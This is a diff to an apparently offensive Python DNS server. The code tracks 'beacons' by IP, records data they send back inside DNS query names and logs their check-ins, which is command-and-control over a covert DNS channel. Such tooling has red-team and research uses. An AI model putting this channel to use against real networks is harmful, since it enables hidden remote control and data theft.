@@ -114,16 +114,23 @@ class DNSQuery:
 """
 def handle_query(query, addr, server):
 
-    print ""
-    print "Recieved query"
     q = DNSQuery()
     q.decode_question(query, 12)
     e = q.entries[0]
-    print "[Q Name : %s] [Q Type : %s] [Q Class : %s]" % (e["qName"], e["qType"], e["qClass"])
+    
+    found = False
     for x in server.beacons:                # check if its a beacon querying
-        if x.ip == addr[0]:    
+        if x.ip == addr[0]:
+            found = True
             if q.names[0][0] != "doshcloud" and q.names[0][0] != "check":
                 x.output += [q.names[0][0]] # add the info the beacon sent back
+            elif q.checkin:
+                print "Beacon %d checking in" % (x.tag)
+    
+    if not found: 
+        print ""
+        print "Recieved query"
+        print "[Q Name : %s] [Q Type : %s] [Q Class : %s]" % (e["qName"], e["qType"], e["qClass"])
 
     txt = True if int(q.qtype) == 16 else False
     answer.send_response(addr, server, q, txt)
